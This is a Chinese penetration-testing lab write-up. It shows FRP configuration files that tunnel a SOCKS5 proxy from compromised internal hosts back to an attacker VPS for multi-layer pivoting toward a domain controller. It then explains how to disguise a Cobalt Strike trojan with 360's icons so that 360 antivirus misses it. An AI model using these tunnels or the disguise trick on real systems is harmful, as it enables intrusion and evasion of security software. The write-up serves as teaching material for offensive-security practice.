## 0x01 FRP代理

### 1.1 代理环境

前一篇文章的时候，模拟的多层网络环境存在一些问题：

*   

```
1.因为我是用本机测试的，为了搭建环境，还添加了两个网卡，其实环境是共通的。2.CS的socks4/4a代理环境其实是不稳定的。
```

内网的代理其实有很多，比如：

![](../Images/829e0f5baecd35e4921bbd866d9eb414.png)

就个人使用而言，`Windows`最好的是`FRP`，`Linux`最好的是`SSH`。本着物尽其用的原则，遇到一个多层的网络环境，我们就使用`FRP`来搭代理。靶机环境如下：

![](../Images/18a002c019ba75fbe0730366605c4b71.png)

*   
*   
*   
*   

```
web服务器 双网卡 1：网卡通外网，跟物理机桥接   2：内网ip：10.10.1.131OA服务器 双网卡不通外网 1：内网ip：10.10.1.130 2：域内ip：10.10.10.166 存在OA服务DC域控 10.10.10.165攻击机：与物理机桥接
```

### 1.2 一层代理

`FRP`代理的搭建其实很简单。主要分为两部分，一部分是服务端的程序+配置文件，另一部分是客户端的程序+配置文件。

`VPS`的配置，上传`frps`和`frps.ini`文件到`VPS`上：

*   
*   

```
服务端程序：frps服务器端配置文件：frps.ini
```

直接上`frps.ini`的配置：

*   
*   
*   
*   
*   
*   
*   
*   

```
[common]      //必需bind_port = 7000   //设定的frp服务端口 token=admin //个人设置的token，用于验证连接，客户端和服务端token相同才能连接。dashboard_port = 7500  //dashboard是frp的web服务，方便管理dashboard_user = admin  //设置frp的web服务的用户名dashboard_pwd = admin  //设置frp的web服务的密码vhost_http_port = 10080  //如果要支持虚拟主机，必须设置用于侦听的 http 端口（非必需项),但是建议添加。vhost_https_port = 10443
```

启动服务端:`./frps -c frps.ini`

![](../Images/c52a2cda9d753473403ef0847311feb8.png)

靶机的设置，上传`frpc.exe`和`frpc.ini`文件。因为靶机为` 64位 windows server2016`，所以上传`frp_windows_amd64` `frpc.ini`配置如下：

*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   

```
[common]server_addr = 123.123.123.123  //VPS地址server_port = 7000   //frp服务端口，跟frps.ini的bind_port对应token=admin  //认证
[TCP]       //连接名称，可以随意设置type = tcp      //连接协议，有tcp、udp、http、https、stcp和xtcp，这里使用tcplocal_ip = 127.0.0.1   //本地iplocal_port = 3389   //本地监听端口，这里选择3389，3389已开启remote_port = 6000  //VPS的端口，建立VPS:6000<->127.0.0.1：3389的连接plugin = socks5  //指明类型use_encryption = true  //是否加密，选择加密use_compression = true  //是否压缩，选择压缩
```

启动客户端：`frpc.exe -c frpc.ini`

![](../Images/fe04dbc2f970c2702bffc5fa905b3249.png)

这个时候，服务器接收到了监听。

![](../Images/07a8780a1f30688c8d1ae4c5647efd7c.png)

然后我们就可以通过`SocksCap`来设置代理。

![](../Images/6445b275d06a27edbf73b69e19158151.png)

测试代理，成功连接。

![](../Images/9c9dfe21ce614812c435b3193fdb297a.png)

在`SocksCap`添加浏览器程序，成功访问第二层网络的`web（10.10.1.130）`：

![](../Images/8fb3aca4095d62e15d4abc406e1af706.png)

第一层`socks5`代理完成。

在这个基础上`windows`可以通过`Ladon`或者`Railgun`等工具进行信息收集，或者`linux`通过`proxychains+namp`等进行探测。

其实还是建议使用`proxifier`来做全局代理，因为`SocksCap`添加工具还是比较费事的，不如全局代理来的直接。

### 1.3 多层代理

一层代理完成，如何做二层代理呢？其实可以通过套娃的方式，我们把`WEB`服务器既作客户端跟`VPS`通信，又作服务端跟`OA`服务器通信。

`OA`服务器上传`frpc.exe`和`frpc.ini`。

**PS: 这里涉及到一个webshell连接的问题，我们获取了一个OA服务器的webshell，在socks5的环境下，冰蝎挂代理，发现连接冰蝎的shell存在问题。可以使用蚁剑添加代理后连接。**

`OA`服务器上传`frpc.ini`

*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   

```
[common]server_addr = 10.10.1.131   //OA服务器访问web服务器通过10.10.1.131访问server_port = 7000token = admin[RDP]type = tcpremote_port = 6666local_port = 6666plugin = socks5        //这里跟一层的代理一样use_encryption = trueuse_compression = true
```

`WEB`服务器上传`frps.ini`

`frps.ini`

*   
*   
*   
*   
*   
*   
*   
*   
*   

```
[[common]bind_addr = 10.10.1.131   //对应OA服务器的server_addrbind_port = 7000   allow_ports = 6666token = admindashboard_user = admindashboard_pwd = adminvhost_http_port = 10080vhost_https_port = 10443
```

`WEB`服务器上传`frpc.ini`（这里是重点）

*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   

```
[common]server_addr = 123.123.123.123server_port = 7000token = admin[TCP]type = tcplocal_ip = 10.10.1.131local_port = 6666 remote_port = 6000use_encryption = trueuse_compression = true
```

**PS: 注意这里不填写plugin = socks5,如果填写无法实现代理。即一层代理（web服务器-》VPS）时，frpc.ini需要填写；多层代理时，第一层代理（OA服务器-》web服务器）需要填写，第二层（web服务器-》VPS）不需要填写。**

这样就达成了二层的`frp`代理。`123.123.123.123:6000->10.10.10.131:6666/192.168.0.114:6666->10.10.10.166:6666/10.10.1.130:6666`

攻击机访问`http://10.10.10.166`的`OA`服务成功。

![](../Images/d24b8e4305c6ebd7d0d05bed0c91f8a4.png)

在此基础上可以对`DC域控（10.10.10.165）`进行端口扫描等渗透操作。

![](../Images/f8fd200b88ab3ea789d6bc260cc4f152.png)

## 0x02 bypass OA服务器的360全家桶

之前测试的时候，发现`OA`服务器是存在`360`全家桶的。

![](../Images/a22949b23540a3d1ed79787bc8a22f77.png)

但是发现上传`CS`木马文件没有被杀，成功上线了`CS`。登上`OA`服务器发现，`360`杀毒开启，对`CS`链路上线的`exe`进行`360`杀毒查杀，发现是存在木马文件的，但是却不处理。也就是这个状态：

![](../Images/b22b848bba4d3ac0753644fa36be4f43.png)

我发现你有问题，就是不杀，就是玩儿~ 查看了一下`360`的设置发现，360杀毒多引擎设置没有开启实时的防护。

![](../Images/de6d460bcd0baf849ef1bc0d560ff2a8.png)

那我们把它全开启，再试试。往`c://widnows/temp`文件夹下上传`smb.exe`，直接查杀。

![](../Images/008d884d90f0c11517a686c4e42934db.png)

那么我们可以对链路上线的`exe`木马进行免杀，不通外网的情况下`bypass 360`。参考:`https://cloud.tencent.com/developer/article/1512006`打开`Restorator 2007`，把木马文件和`360`安全卫士的程序都拖进去。

![](../Images/5113dcc911d990fc31d1b6799c0402a6.png)

然后把`360`的图标文件夹复制到`smb.exe`里，并另存为`360.exe`

![](../Images/93b80aebffc01a80f30e37db3935dfa2.png)

使用`360`杀毒查杀一下`，bypass了360`。

![](../Images/81d547037f2613c826b1f665b5ff0393.png)

执行一下，成功上线。

![](../Images/c4453e1ee1928c3ebd938f9477b4f6c1.png)

执行命令也没问题。

![](../Images/de6b0719153ea2af1d51da8bf4a14c43.png)
